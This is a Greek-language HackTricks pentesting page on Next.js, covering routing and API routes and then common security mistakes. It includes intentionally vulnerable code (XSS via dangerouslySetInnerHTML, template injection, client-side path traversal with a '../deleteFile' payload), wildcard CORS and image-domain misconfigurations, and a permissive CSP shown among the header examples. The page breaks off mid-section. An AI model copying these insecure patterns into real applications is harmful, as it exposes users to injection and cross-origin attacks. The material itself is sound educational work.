# NextJS

{{#include ../../banners/hacktricks-training.md}}

## Γενική Αρχιτεκτονική μιας Εφαρμογής Next.js

### Τυπική Δομή Αρχείων

Ένα τυπικό έργο Next.js ακολουθεί μια συγκεκριμένη δομή αρχείων και φακέλων που διευκολύνει λειτουργίες όπως δρομολόγηση, API endpoints και διαχείριση στατικών πόρων. Ακολουθεί μια τυπική διάταξη:
```lua
my-nextjs-app/
├── node_modules/
├── public/
│   ├── images/
│   │   └── logo.png
│   └── favicon.ico
├── app/
│   ├── api/
│   │   └── hello/
│   │       └── route.ts
│   ├── layout.tsx
│   ├── page.tsx
│   ├── about/
│   │   └── page.tsx
│   ├── dashboard/
│   │   ├── layout.tsx
│   │   └── page.tsx
│   ├── components/
│   │   ├── Header.tsx
│   │   └── Footer.tsx
│   ├── styles/
│   │   ├── globals.css
│   │   └── Home.module.css
│   └── utils/
│       └── api.ts
├── .env.local
├── next.config.js
├── tsconfig.json
├── package.json
├── README.md
└── yarn.lock / package-lock.json

```
### Κύριοι Κατάλογοι και Αρχεία

- **public/:** Φιλοξενεί στατικά αρχεία όπως εικόνες, γραμματοσειρές και άλλα αρχεία. Τα αρχεία εδώ είναι προσβάσιμα στη ρίζα (`/`).
- **app/:** Κεντρικός κατάλογος για τις σελίδες, τα layouts, components, και τις API routes της εφαρμογής. Υιοθετεί το **App Router** παράδειγμα, επιτρέποντας εξελιγμένες λειτουργίες δρομολόγησης και διαχωρισμό server-client components.
- **app/layout.tsx:** Ορίζει το root layout της εφαρμογής, τυλίγοντας όλες τις σελίδες και παρέχοντας σταθερά στοιχεία UI όπως headers, footers και γραμμές πλοήγησης.
- **app/page.tsx:** Λειτουργεί ως είσοδος για τη ρίζα `/`, αποδίδοντας την κεντρική σελίδα.
- **app/[route]/page.tsx:** Χειρίζεται στατικές και δυναμικές διαδρομές. Κάθε φάκελος μέσα σε `app/` αντιπροσωπεύει ένα segment διαδρομής, και το `page.tsx` μέσα σε αυτούς τους φακέλους αντιστοιχεί στο component της διαδρομής.
- **app/api/:** Περιέχει API routes, επιτρέποντας τη δημιουργία serverless functions που χειρίζονται HTTP requests. Αυτές οι routes αντικαθιστούν τον παραδοσιακό κατάλογο `pages/api`.
- **app/components/:** Περιέχει επαναχρησιμοποιήσιμα React components που μπορούν να χρησιμοποιηθούν σε διάφορες σελίδες και layouts.
- **app/styles/:** Περιλαμβάνει global CSS αρχεία και CSS Modules για styling σε επίπεδο component.
- **app/utils/:** Περιλαμβάνει utility functions, helper modules και άλλη μη-UI λογική που μπορεί να μοιραστεί σε όλη την εφαρμογή.
- **.env.local:** Αποθηκεύει environment variables ειδικά για το τοπικό development. Αυτές οι μεταβλητές **δεν** δεσμεύονται στο version control.
- **next.config.js:** Προσαρμόζει τη συμπεριφορά του Next.js, συμπεριλαμβανομένων webpack configurations, environment variables και ρυθμίσεων ασφάλειας.
- **tsconfig.json:** Διαμορφώνει τις ρυθμίσεις TypeScript για το project, ενεργοποιώντας type checking και άλλες TypeScript δυνατότητες.
- **package.json:** Διαχειρίζεται τις εξαρτήσεις του project, scripts και metadata.
- **README.md:** Παρέχει τεκμηρίωση και πληροφορίες για το project, συμπεριλαμβανομένων οδηγιών εγκατάστασης, οδηγιών χρήσης και άλλων σχετικών λεπτομερειών.
- **yarn.lock / package-lock.json:** Κλειδώνουν τις εξαρτήσεις του project σε συγκεκριμένες εκδόσεις, διασφαλίζοντας συνεπείς εγκαταστάσεις σε διαφορετικά περιβάλλοντα.

## Client-Side in Next.js

### File-Based Routing in the `app` Directory

Ο κατάλογος `app` είναι το θεμέλιο της δρομολόγησης στις νεότερες εκδόσεις του Next.js. Αξιοποιεί το filesystem για να ορίσει διαδρομές, κάνοντας τη διαχείριση διαδρομών διαισθητική και κλιμακώσιμη.

<details>

<summary>Χειρισμός της ρίζας /</summary>

**Δομή Αρχείων:**
```arduino
my-nextjs-app/
├── app/
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Βασικά Αρχεία:**

- **`app/page.tsx`**: Διαχειρίζεται αιτήματα προς τη ρίζα (`/`).
- **`app/layout.tsx`**: Ορίζει τη διάταξη της εφαρμογής, που περικλείει όλες τις σελίδες.

**Υλοποίηση:**
```tsx
tsxCopy code// app/page.tsx

export default function HomePage() {
return (
<div>
<h1>Welcome to the Home Page!</h1>
<p>This is the root route.</p>
</div>
);
}
```
**Επεξήγηση:**

- **Ορισμός διαδρομής:** Το αρχείο `page.tsx` που βρίσκεται απευθείας στον κατάλογο `app` αντιστοιχεί στη διαδρομή `/`.
- **Απόδοση:** Αυτό το component αποδίδει το περιεχόμενο για την αρχική σελίδα.
- **Ενσωμάτωση layout:** Το component `HomePage` τυλίγεται από το `layout.tsx`, το οποίο μπορεί να περιλαμβάνει headers, footers και άλλα κοινά στοιχεία.

</details>

<details>

<summary>Διαχείριση άλλων στατικών διαδρομών</summary>

**Παράδειγμα: Διαδρομή `/about`**

**Δομή Αρχείων:**
```arduino
arduinoCopy codemy-nextjs-app/
├── app/
│   ├── about/
│   │   └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Υλοποίηση:**
```tsx
// app/about/page.tsx

export default function AboutPage() {
return (
<div>
<h1>About Us</h1>
<p>Learn more about our mission and values.</p>
</div>
)
}
```
**Επεξήγηση:**

- **Ορισμός διαδρομής:** Το αρχείο `page.tsx` μέσα στο φάκελο `about` αντιστοιχεί στη διαδρομή `/about`.
- **Απόδοση:** Αυτό το component αποδίδει το περιεχόμενο για τη σελίδα about.

</details>

<details>

<summary>Dynamic Routes</summary>

Οι δυναμικές διαδρομές επιτρέπουν τη διαχείριση μονοπατιών με μεταβλητά τμήματα, δίνοντας τη δυνατότητα στις εφαρμογές να εμφανίζουν περιεχόμενο βάσει παραμέτρων όπως IDs, slugs κ.λπ.

**Παράδειγμα: `/posts/[id]` Route**

**Δομή Αρχείων:**
```arduino
arduinoCopy codemy-nextjs-app/
├── app/
│   ├── posts/
│   │   └── [id]/
│   │       └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Υλοποίηση:**
```tsx
tsxCopy code// app/posts/[id]/page.tsx

import { useRouter } from 'next/navigation';

interface PostProps {
params: { id: string };
}

export default function PostPage({ params }: PostProps) {
const { id } = params;
// Fetch post data based on 'id'

return (
<div>
<h1>Post #{id}</h1>
<p>This is the content of post {id}.</p>
</div>
);
}
```
**Επεξήγηση:**

- **Δυναμικό Τμήμα:** `[id]` υποδηλώνει ένα δυναμικό τμήμα στη διαδρομή, καταγράφοντας την παράμετρο `id` από το URL.
- **Πρόσβαση σε Παραμέτρους:** Το αντικείμενο `params` περιέχει τις δυναμικές παραμέτρους, προσβάσιμες μέσα στο component.
- **Ταυτοποίηση Διαδρομής:** Οποιαδήποτε διαδρομή που ταιριάζει με `/posts/*`, όπως `/posts/1`, `/posts/abc`, κ.λπ., θα χειρίζεται από αυτό το component.

</details>

<details>

<summary>Nested Routes</summary>

Το Next.js υποστηρίζει εμφωλευμένες διαδρομές, επιτρέποντας ιεραρχικές δομές διαδρομών που αντικατοπτρίζουν τη διάταξη των φακέλων.

**Παράδειγμα: `/dashboard/settings/profile` Route**

**Δομή Αρχείων:**
```arduino
arduinoCopy codemy-nextjs-app/
├── app/
│   ├── dashboard/
│   │   ├── settings/
│   │   │   └── profile/
│   │   │       └── page.tsx
│   │   └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Υλοποίηση:**
```tsx
tsxCopy code// app/dashboard/settings/profile/page.tsx

export default function ProfileSettingsPage() {
return (
<div>
<h1>Profile Settings</h1>
<p>Manage your profile information here.</p>
</div>
);
}
```
**Επεξήγηση:**

- **Βαθιά εμφώλευση:** Το αρχείο `page.tsx` μέσα στο `dashboard/settings/profile/` αντιστοιχεί στη διαδρομή `/dashboard/settings/profile`.
- **Αντανάκλαση της ιεραρχίας:** Η δομή των φακέλων αντανακλά τη διαδρομή URL, βελτιώνοντας τη συντηρησιμότητα και την ευκρίνεια.

</details>

<details>

<summary>Διαδρομές Catch-All</summary>

Οι διαδρομές catch-all χειρίζονται πολλαπλά εμφωλευμένα τμήματα ή άγνωστες διαδρομές, προσφέροντας ευελιξία στον χειρισμό διαδρομών.

**Παράδειγμα: `/*` Διαδρομή**

**Δομή Αρχείων:**
```arduino
my-nextjs-app/
├── app/
│   ├── [...slug]/
│   │   └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Υλοποίηση:**
```tsx
// app/[...slug]/page.tsx

interface CatchAllProps {
params: { slug: string[] }
}

export default function CatchAllPage({ params }: CatchAllProps) {
const { slug } = params
const fullPath = `/${slug.join("/")}`

return (
<div>
<h1>Catch-All Route</h1>
<p>You have navigated to: {fullPath}</p>
</div>
)
}
```
**Εξήγηση:**

- **Catch-All Segment:** `[...slug]` καταγράφει όλα τα υπόλοιπα τμήματα της διαδρομής ως πίνακα.
- **Usage:** Χρήσιμο για χειρισμό δυναμικών σεναρίων δρομολόγησης όπως paths που δημιουργούνται από χρήστες, nested κατηγορίες, κ.λπ.
- **Route Matching:** Διαδρομές όπως `/anything/here`, `/foo/bar/baz`, κ.λπ., χειρίζονται από αυτό το component.

</details>

### Πιθανές ευπάθειες client-side

Παρόλο που το Next.js παρέχει ένα ασφαλές θεμέλιο, εσφαλμένες πρακτικές κωδικοποίησης μπορούν να εισαγάγουν ευπάθειες. Βασικές client-side ευπάθειες περιλαμβάνουν:

<details>

<summary>Cross-Site Scripting (XSS)</summary>

Οι επιθέσεις XSS συμβαίνουν όταν κακόβουλα scripts εγχέονται σε αξιόπιστες ιστοσελίδες. Οι επιτιθέμενοι μπορούν να εκτελέσουν scripts στα προγράμματα περιήγησης των χρηστών, κλέβοντας δεδομένα ή πραγματοποιώντας ενέργειες εκ μέρους του χρήστη.

**Παράδειγμα ευπαθούς κώδικα:**
```jsx
// Dangerous: Injecting user input directly into HTML
function Comment({ userInput }) {
return <div dangerouslySetInnerHTML={{ __html: userInput }} />
}
```
**Γιατί Είναι Ευάλωτο:** Η χρήση του `dangerouslySetInnerHTML` με μη αξιόπιστη είσοδο επιτρέπει σε επιτιθέμενους να εγχέουν κακόβουλα scripts.

</details>

<details>

<summary>Client-Side Template Injection</summary>

Συμβαίνει όταν οι εισροές χρηστών χειρίζονται ακατάλληλα σε templates, επιτρέποντας σε επιτιθέμενους να εγχέουν και να εκτελούν templates ή expressions.

**Παράδειγμα Ευάλωτου Κώδικα:**
```jsx
import React from "react"
import ejs from "ejs"

function RenderTemplate({ template, data }) {
const html = ejs.render(template, data)
return <div dangerouslySetInnerHTML={{ __html: html }} />
}
```
**Γιατί είναι ευάλωτο:** Αν το `template` ή το `data` περιέχει κακόβουλο περιεχόμενο, μπορεί να οδηγήσει στην εκτέλεση μη επιθυμητού κώδικα.

</details>

<details>

<summary>Client Path Traversal</summary>

Πρόκειται για ευπάθεια που επιτρέπει σε επιτιθέμενους να χειραγωγήσουν client-side paths για να εκτελέσουν μη επιθυμητές ενέργειες, όπως Cross-Site Request Forgery (CSRF). Σε αντίθεση με το server-side path traversal, που στοχεύει στο filesystem του server, το CSPT επικεντρώνεται στην εκμετάλλευση μηχανισμών στην πλευρά του client για να αναδρομολογήσει νόμιμα API requests σε κακόβουλα endpoints.

**Παράδειγμα ευάλωτου κώδικα:**

Μια εφαρμογή Next.js επιτρέπει στους χρήστες να ανεβάζουν και να κατεβάζουν αρχεία. Η λειτουργία λήψης είναι υλοποιημένη στην client side, όπου οι χρήστες μπορούν να καθορίσουν το file path για λήψη.
```jsx
// pages/download.js
import { useState } from "react"

export default function DownloadPage() {
const [filePath, setFilePath] = useState("")

const handleDownload = () => {
fetch(`/api/files/${filePath}`)
.then((response) => response.blob())
.then((blob) => {
const url = window.URL.createObjectURL(blob)
const a = document.createElement("a")
a.href = url
a.download = filePath
a.click()
})
}

return (
<div>
<h1>Download File</h1>
<input
type="text"
value={filePath}
onChange={(e) => setFilePath(e.target.value)}
placeholder="Enter file path"
/>
<button onClick={handleDownload}>Download</button>
</div>
)
}
```
#### Σενάριο Επίθεσης

1. **Στόχος του επιτιθέμενου**: Εκτέλεση CSRF επίθεσης για τη διαγραφή ενός κρίσιμου αρχείου (π.χ., `admin/config.json`) με την παραποίηση του `filePath`.
2. **Εκμετάλλευση CSPT**:
- **Κακόβουλη Είσοδος**: Ο επιτιθέμενος δημιουργεί ένα URL με παραποιημένο `filePath` όπως `../deleteFile/config.json`.
- **Προκύπτον Κλήση API**: Ο client-side κώδικας κάνει ένα αίτημα στο `/api/files/../deleteFile/config.json`.
- **Χειρισμός από το Server**: Εάν ο server δεν επικυρώνει το `filePath`, επεξεργάζεται το αίτημα, ενδεχομένως διαγράφοντας ή εκθέτοντας ευαίσθητα αρχεία.
3. **Εκτέλεση CSRF**:
- **Κατασκευασμένος Σύνδεσμος**: Ο επιτιθέμενος στέλνει στο θύμα έναν σύνδεσμο ή ενσωματώνει ένα κακόβουλο script που ενεργοποιεί το αίτημα download με το παραποιημένο `filePath`.
- **Αποτέλεσμα**: Το θύμα εκτελεί ασυνείδητα τη δράση, οδηγώντας σε μη εξουσιοδοτημένη πρόσβαση ή διαγραφή αρχείων.

#### Γιατί Είναι Ευάλωτο

- **Έλλειψη Επικύρωσης Εισόδου**: Το client-side επιτρέπει αυθαίρετες εισόδους `filePath`, επιτρέποντας path traversal.
- **Εμπιστοσύνη στις Εισόδους του Client**: Το server-side API εμπιστεύεται και επεξεργάζεται το `filePath` χωρίς sanitization.
- **Πιθανές Ενέργειες του API**: Εάν το API endpoint εκτελεί ενέργειες που αλλάζουν κατάσταση (π.χ., διαγραφή, τροποποίηση αρχείων), μπορεί να εκμεταλλευτεί μέσω CSPT.

</details>

## Server-Side στο Next.js

### Απόδοση από την πλευρά του server (SSR)

Οι σελίδες αποδίδονται στον server σε κάθε αίτημα, εξασφαλίζοντας ότι ο χρήστης λαμβάνει πλήρως αποδομένο HTML. Σε αυτή την περίπτωση πρέπει να δημιουργήσετε τον δικό σας προσαρμοσμένο server για να επεξεργάζεται τα αιτήματα.

**Περιπτώσεις Χρήσης:**

- Δυναμικό περιεχόμενο που αλλάζει συχνά.
- Βελτιστοποίηση SEO, καθώς οι μηχανές αναζήτησης μπορούν να ανιχνεύσουν την πλήρως αποδομένη σελίδα.

**Υλοποίηση:**
```jsx
// pages/index.js
export async function getServerSideProps(context) {
const res = await fetch("https://api.example.com/data")
const data = await res.json()
return { props: { data } }
}

function HomePage({ data }) {
return <div>{data.title}</div>
}

export default HomePage
```
### Στατική παραγωγή ιστοτόπων (SSG)

Οι σελίδες προ-αποδίδονται κατά το χρόνο build, με αποτέλεσμα ταχύτερους χρόνους φόρτωσης και μειωμένο φόρτο στον διακομιστή.

**Περιπτώσεις Χρήσης:**

- Περιεχόμενο που δεν αλλάζει συχνά.
- Blogs, τεκμηρίωση, σελίδες μάρκετινγκ.

**Υλοποίηση:**
```jsx
// pages/index.js
export async function getStaticProps() {
const res = await fetch("https://api.example.com/data")
const data = await res.json()
return { props: { data }, revalidate: 60 } // Revalidate every 60 seconds
}

function HomePage({ data }) {
return <div>{data.title}</div>
}

export default HomePage
```
### Συναρτήσεις χωρίς διακομιστή (API Routes)

Next.js επιτρέπει τη δημιουργία API endpoints ως συναρτήσεις χωρίς διακομιστή. Αυτές οι συναρτήσεις εκτελούνται κατά απαίτηση χωρίς την ανάγκη για έναν αφιερωμένο διακομιστή.

**Περιπτώσεις χρήσης:**

- Διαχείριση υποβολών φορμών.
- Αλληλεπίδραση με βάσεις δεδομένων.
- Επεξεργασία δεδομένων ή ενσωμάτωση με APIs τρίτων.

**Υλοποίηση:**

Με την εισαγωγή του καταλόγου `app` στο Next.js 13, το routing και η διαχείριση API έχουν γίνει πιο ευέλικτα και ισχυρά. Αυτή η σύγχρονη προσέγγιση ευθυγραμμίζεται στενά με το file-based routing σύστημα αλλά εισάγει βελτιωμένες δυνατότητες, συμπεριλαμβανομένης της υποστήριξης για server και client components.

#### Βασικός Route Handler

**Δομή αρχείων:**
```go
my-nextjs-app/
├── app/
│   └── api/
│       └── hello/
│           └── route.js
├── package.json
└── ...
```
**Υλοποίηση:**
```javascript
// app/api/hello/route.js

export async function POST(request) {
return new Response(JSON.stringify({ message: "Hello from App Router!" }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}

// Client-side fetch to access the API endpoint
fetch("/api/submit", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ name: "John Doe" }),
})
.then((res) => res.json())
.then((data) => console.log(data))
```
**Επεξήγηση:**

- **Τοποθεσία:** Οι API routes τοποθετούνται στον κατάλογο `app/api/`.
- **Ονομασία αρχείων:** Κάθε API endpoint βρίσκεται στον δικό του φάκελο που περιέχει αρχείο `route.js` ή `route.ts`.
- **Εξαγόμενες συναρτήσεις:** Αντί για ένα μόνο default export, εξάγονται συναρτήσεις για συγκεκριμένες HTTP μεθόδους (π.χ. `GET`, `POST`).
- **Διαχείριση Response:** Χρησιμοποιήστε τον constructor `Response` για να επιστρέφετε responses, επιτρέποντας μεγαλύτερο έλεγχο στα headers και τα status codes.

#### Πώς να χειριστείτε άλλες διαδρομές και μεθόδους:

<details>

<summary>Handling Specific HTTP Methods</summary>

Next.js 13+ σας επιτρέπει να ορίσετε handlers για συγκεκριμένες HTTP μεθόδους μέσα στο ίδιο αρχείο `route.js` ή `route.ts`, προάγοντας πιο καθαρό και οργανωμένο κώδικα.

**Παράδειγμα:**
```javascript
// app/api/users/[id]/route.js

export async function GET(request, { params }) {
const { id } = params
// Fetch user data based on 'id'
return new Response(JSON.stringify({ userId: id, name: "Jane Doe" }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}

export async function PUT(request, { params }) {
const { id } = params
// Update user data based on 'id'
return new Response(JSON.stringify({ message: `User ${id} updated.` }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}

export async function DELETE(request, { params }) {
const { id } = params
// Delete user based on 'id'
return new Response(JSON.stringify({ message: `User ${id} deleted.` }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}
```
**Επεξήγηση:**

- **Πολλαπλές εξαγωγές:** Κάθε HTTP μέθοδος (`GET`, `PUT`, `DELETE`) έχει τη δική της εξαγόμενη συνάρτηση.
- **Παράμετροι:** Το δεύτερο όρισμα παρέχει πρόσβαση στις παραμέτρους της διαδρομής μέσω του `params`.
- **Βελτιωμένες αποκρίσεις:** Μεγαλύτερος έλεγχος στα αντικείμενα απόκρισης, επιτρέποντας ακριβή διαχείριση κεφαλίδων και κωδικών κατάστασης.

</details>

<details>

<summary>Catch-All and Nested Routes</summary>

Next.js 13+ υποστηρίζει προηγμένα χαρακτηριστικά δρομολόγησης όπως catch-all routes και εμφωλευμένες API routes, επιτρέποντας πιο δυναμικές και κλιμακούμενες δομές API.

**Παράδειγμα Catch-All Route:**
```javascript
// app/api/[...slug]/route.js

export async function GET(request, { params }) {
const { slug } = params
// Handle dynamic nested routes
return new Response(JSON.stringify({ slug }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}
```
**Επεξήγηση:**

- **Σύνταξη:** `[...]` δηλώνει ένα catch-all τμήμα, το οποίο συλλαμβάνει όλες τις ενθετές διαδρομές.
- **Χρήση:** Χρήσιμο για APIs που πρέπει να χειρίζονται μεταβαλλόμενο βάθος διαδρομών ή δυναμικά τμήματα.

**Παράδειγμα Ενθετών Διαδρομών:**
```javascript
// app/api/posts/[postId]/comments/[commentId]/route.js

export async function GET(request, { params }) {
const { postId, commentId } = params
// Fetch specific comment for a post
return new Response(
JSON.stringify({ postId, commentId, comment: "Great post!" }),
{
status: 200,
headers: { "Content-Type": "application/json" },
}
)
}
```
**Επεξήγηση:**

- **Βαθιά εμφώλευση:** Επιτρέπει ιεραρχικές δομές API, αντικατοπτρίζοντας τις σχέσεις πόρων.
- **Πρόσβαση σε παραμέτρους:** Εύκολη πρόσβαση σε πολλαπλές παραμέτρους διαδρομής μέσω του αντικειμένου `params`.

</details>

<details>

<summary>Διαχείριση API routes στο Next.js 12 και παλαιότερα</summary>

## API Routes στον κατάλογο `pages` (Next.js 12 και παλαιότερα)

Πριν το Next.js 13 εισαγάγει τον κατάλογο `app` και τις βελτιωμένες δυνατότητες δρομολόγησης, οι API routes ορίζονταν κυρίως μέσα στον κατάλογο `pages`. Αυτή η προσέγγιση εξακολουθεί να χρησιμοποιείται ευρέως και υποστηρίζεται στις εκδόσεις Next.js 12 και παλαιότερες.

#### Βασική API Route

**Δομή αρχείων:**
```go
goCopy codemy-nextjs-app/
├── pages/
│   └── api/
│       └── hello.js
├── package.json
└── ...
```
**Υλοποίηση:**
```javascript
javascriptCopy code// pages/api/hello.js

export default function handler(req, res) {
res.status(200).json({ message: 'Hello, World!' });
}
```
**Επεξήγηση:**

- **Τοποθεσία:** API routes βρίσκονται στον κατάλογο `pages/api/`.
- **Export:** Χρησιμοποιήστε `export default` για να ορίσετε τη συνάρτηση handler.
- **Υπογραφή Συνάρτησης:** Ο handler δέχεται τα αντικείμενα `req` (HTTP request) και `res` (HTTP response).
- **Routing:** Το όνομα αρχείου (`hello.js`) αντιστοιχίζεται στο endpoint `/api/hello`.

#### Δυναμικές API Routes

**Δομή Αρχείων:**
```bash
bashCopy codemy-nextjs-app/
├── pages/
│   └── api/
│       └── users/
│           └── [id].js
├── package.json
└── ...
```
**Υλοποίηση:**
```javascript
javascriptCopy code// pages/api/users/[id].js

export default function handler(req, res) {
const {
query: { id },
method,
} = req;

switch (method) {
case 'GET':
// Fetch user data based on 'id'
res.status(200).json({ userId: id, name: 'John Doe' });
break;
case 'PUT':
// Update user data based on 'id'
res.status(200).json({ message: `User ${id} updated.` });
break;
case 'DELETE':
// Delete user based on 'id'
res.status(200).json({ message: `User ${id} deleted.` });
break;
default:
res.setHeader('Allow', ['GET', 'PUT', 'DELETE']);
res.status(405).end(`Method ${method} Not Allowed`);
}
}
```
**Εξήγηση:**

- **Δυναμικά Τμήματα:** Οι αγκύλες τετραγώνου (`[id].js`) υποδηλώνουν δυναμικά τμήματα διαδρομής.
- **Πρόσβαση Παραμέτρων:** Χρησιμοποιήστε `req.query.id` για πρόσβαση στη δυναμική παράμετρο.
- **Διαχείριση Μεθόδων:** Χρησιμοποιήστε λογική υπό όρους για να χειριστείτε διαφορετικές HTTP μεθόδους (`GET`, `PUT`, `DELETE`, κ.λπ.).

#### Διαχείριση Διαφορετικών HTTP Μεθόδων

Ενώ το βασικό παράδειγμα API route χειρίζεται όλες τις HTTP μεθόδους μέσα σε μία συνάρτηση, μπορείτε να δομήσετε τον κώδικά σας ώστε να χειρίζεται κάθε μέθοδο ρητά για καλύτερη σαφήνεια και συντηρησιμότητα.

**Παράδειγμα:**
```javascript
javascriptCopy code// pages/api/posts.js

export default async function handler(req, res) {
const { method } = req;

switch (method) {
case 'GET':
// Handle GET request
res.status(200).json({ message: 'Fetching posts.' });
break;
case 'POST':
// Handle POST request
res.status(201).json({ message: 'Post created.' });
break;
default:
res.setHeader('Allow', ['GET', 'POST']);
res.status(405).end(`Method ${method} Not Allowed`);
}
}
```
**Βέλτιστες Πρακτικές:**

- **Διαχωρισμός Ευθυνών:** Διαχωρίστε ξεκάθαρα τη λογική για διαφορετικές HTTP μεθόδους.
- **Συνέπεια Απαντήσεων:** Εξασφαλίστε συνεπείς δομές απαντήσεων για ευκολότερο χειρισμό στο client-side.
- **Χειρισμός Σφαλμάτων:** Αντιμετωπίστε με ομαλό τρόπο μη υποστηριζόμενες μεθόδους και απρόβλεπτα σφάλματα.

</details>

### CORS Διαμόρφωση

Ελέγξτε ποιες origins έχουν πρόσβαση στις API routes σας, για να μειώσετε τις ευπάθειες Cross-Origin Resource Sharing (CORS).

**Κακό Παράδειγμα Διαμόρφωσης:**
```javascript
// app/api/data/route.js

export async function GET(request) {
return new Response(JSON.stringify({ data: "Public Data" }), {
status: 200,
headers: {
"Access-Control-Allow-Origin": "*", // Allows any origin
"Access-Control-Allow-Methods": "GET, POST, PUT, DELETE",
},
})
}
```
Σημειώστε ότι **CORS μπορεί επίσης να ρυθμιστεί σε όλες τις API routes** μέσα στο αρχείο **`middleware.ts`**:
```javascript
// app/middleware.ts

import { NextResponse } from "next/server"
import type { NextRequest } from "next/server"

export function middleware(request: NextRequest) {
const allowedOrigins = [
"https://yourdomain.com",
"https://sub.yourdomain.com",
]
const origin = request.headers.get("Origin")

const response = NextResponse.next()

if (allowedOrigins.includes(origin || "")) {
response.headers.set("Access-Control-Allow-Origin", origin || "")
response.headers.set(
"Access-Control-Allow-Methods",
"GET, POST, PUT, DELETE, OPTIONS"
)
response.headers.set(
"Access-Control-Allow-Headers",
"Content-Type, Authorization"
)
// If credentials are needed:
// response.headers.set('Access-Control-Allow-Credentials', 'true');
}

// Handle preflight requests
if (request.method === "OPTIONS") {
return new Response(null, {
status: 204,
headers: response.headers,
})
}

return response
}

export const config = {
matcher: "/api/:path*", // Apply to all API routes
}
```
**Πρόβλημα:**

- **`Access-Control-Allow-Origin: '*'`:** Επιτρέπει σε οποιονδήποτε ιστότοπο να έχει πρόσβαση στο API, ενδεχομένως επιτρέποντας σε κακόβουλους ιστότοπους να αλληλεπιδρούν με το API σας χωρίς περιορισμούς.
- **Ευρεία Επιτρεπόμενη Χρήση Μεθόδων:** Η αποδοχή όλων των μεθόδων μπορεί να επιτρέψει σε επιτιθέμενους να εκτελέσουν ανεπιθύμητες ενέργειες.

**Πώς το εκμεταλλεύονται οι επιτιθέμενοι:**

Οι επιτιθέμενοι μπορούν να δημιουργήσουν κακόβουλους ιστότοπους που κάνουν αιτήματα στο API σας, ενδεχομένως καταχρώμενοι λειτουργίες όπως ανάκτηση δεδομένων, τροποποίηση δεδομένων ή ενεργοποίηση ανεπιθύμητων ενεργειών εκ μέρους αυθεντικοποιημένων χρηστών.


{{#ref}}
../../pentesting-web/cors-bypass.md
{{#endref}}

### Έκθεση Server code στον Client Side

Μπορεί να είναι εύκολο να **χρησιμοποιηθεί code που χρησιμοποιείται από τον server και επίσης να εκτεθεί και να χρησιμοποιηθεί από τον client side**, ο καλύτερος τρόπος για να διασφαλίσετε ότι ένα αρχείο code δεν εκτίθεται ποτέ στον client side είναι να χρησιμοποιήσετε αυτό το import στην αρχή του αρχείου:
```js
import "server-only"
```
## Βασικά αρχεία και ο ρόλος τους

### `middleware.ts` / `middleware.js`

**Location:** Στη ρίζα του έργου ή μέσα στο `src/`.

**Purpose:** Εκτελεί κώδικα σε μια server-side serverless συνάρτηση πριν επεξεργαστεί ένα αίτημα, επιτρέποντας εργασίες όπως έλεγχος ταυτότητας, ανακατευθύνσεις ή τροποποίηση των αποκρίσεων.

**Execution Flow:**

1. **Incoming Request:** Το middleware παρεμβαίνει στο εισερχόμενο αίτημα.
2. **Processing:** Εκτελεί λειτουργίες βάσει του αιτήματος (π.χ. έλεγχος ταυτότητας).
3. **Response Modification:** Μπορεί να τροποποιήσει την απόκριση ή να παραδώσει τον έλεγχο στον επόμενο χειριστή.

**Example Use Cases:**

- Ανακατεύθυνση μη αυθεντικοποιημένων χρηστών.
- Προσθήκη προσαρμοσμένων κεφαλίδων.
- Καταγραφή αιτημάτων.

**Sample Configuration:**
```typescript
// middleware.ts
import { NextResponse } from "next/server"
import type { NextRequest } from "next/server"

export function middleware(req: NextRequest) {
const url = req.nextUrl.clone()
if (!req.cookies.has("token")) {
url.pathname = "/login"
return NextResponse.redirect(url)
}
return NextResponse.next()
}

export const config = {
matcher: ["/protected/:path*"],
}
```
### `next.config.js`

**Τοποθεσία:** Στη ρίζα του έργου.

**Σκοπός:** Ρυθμίζει τη συμπεριφορά του Next.js, ενεργοποιώντας ή απενεργοποιώντας λειτουργίες, προσαρμόζοντας ρυθμίσεις webpack, ορίζοντας μεταβλητές περιβάλλοντος και ρυθμίζοντας διάφορες λειτουργίες ασφάλειας.

**Κύριες ρυθμίσεις ασφάλειας:**

<details>

<summary>Κεφαλίδες ασφαλείας</summary>

Οι κεφαλίδες ασφαλείας ενισχύουν την ασφάλεια της εφαρμογής σας δίνοντας οδηγίες στους browsers σχετικά με τον τρόπο χειρισμού του περιεχομένου. Βοηθούν στην αποτροπή διαφόρων επιθέσεων όπως Cross-Site Scripting (XSS), Clickjacking, και MIME type sniffing:

- Content Security Policy (CSP)
- X-Frame-Options
- X-Content-Type-Options
- Strict-Transport-Security (HSTS)
- Referrer Policy

**Παραδείγματα:**
```javascript
// next.config.js

module.exports = {
async headers() {
return [
{
source: "/(.*)", // Apply to all routes
headers: [
{
key: "X-Frame-Options",
value: "DENY",
},
{
key: "Content-Security-Policy",
value:
"default-src *; script-src 'self' 'unsafe-inline' 'unsafe-eval';",
},
{
key: "X-Content-Type-Options",
value: "nosniff",
},
{
key: "Strict-Transport-Security",
value: "max-age=63072000; includeSubDomains; preload", // Enforces HTTPS
},
{
key: "Referrer-Policy",
value: "no-referrer", // Completely hides referrer
},
// Additional headers...
],
},
]
},
}
```
</details>

<details>

<summary>Ρυθμίσεις βελτιστοποίησης εικόνων</summary>

Next.js βελτιστοποιεί τις εικόνες για απόδοση, αλλά λανθασμένες ρυθμίσεις μπορούν να οδηγήσουν σε ευπάθειες ασφαλείας, όπως η δυνατότητα σε μη αξιόπιστες πηγές να εισάγουν κακόβουλο περιεχόμενο.

**Παράδειγμα κακής ρύθμισης:**
```javascript
// next.config.js

module.exports = {
images: {
domains: ["*"], // Allows images from any domain
},
}
```
**Πρόβλημα:**

